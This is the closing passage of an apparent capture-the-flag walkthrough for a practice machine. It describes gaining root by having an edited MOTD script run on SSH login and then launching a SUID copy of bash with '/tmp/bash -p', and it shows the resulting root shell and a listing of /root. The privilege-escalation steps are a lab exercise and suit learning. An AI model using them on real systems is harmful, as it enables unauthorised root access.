#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
```

But how does this execute? Is there a cron? don’t think so.

Since, the .bash\_history shows we need to ssh for the instructions to execute, let’s try and SSH as james.

![](https://umar0x01.sh/img/debug-thm/Pasted%20image%2020210403150745.png)

#### Root! <a id="root"></a>

Cool, we’ve got SUID bit of root user on the bash file, let’s get root! :\)

```d
james@osboxes:~$ /tmp/bash  -p
bash-4.3# id
uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james)
bash-4.3# cd /root
bash-4.3# ls -al 
total 48
drwx------  7 root root 4096 Mar 10 18:36 .
drwxr-xr-x 24 root root 4096 Feb 28  2019 ..
-rw-------  1 root root 1257 Mar 10 18:38 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  3 root root 4096 Mar  9 20:01 .bundle
drwx------  2 root root 4096 Mar 10 18:36 .cache
drwxr-xr-x  3 root root 4096 Mar  9 20:00 .gem
drwxr-xr-x  2 root root 4096 Mar 10 18:35 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Mar  9 20:56 root.txt
drwx------  2 root root 4096 Mar  9 20:55 .ssh
-rw-r--r--  1 root root  211 Mar  9 19:59 .wget-hsts
bash-4.3# 
bash-4.3# 
```

The flag is of the characters what we need!

```d
bash-4.3# wc -c root.txt 
33 root.txt
bash-4.3# id
uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james)
bash-4.3# uname -a 
Linux osboxes 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Thanks for reading the walkthrough, hopefully you enjoyed it. I think maybe I was too verbose while writing it :P  


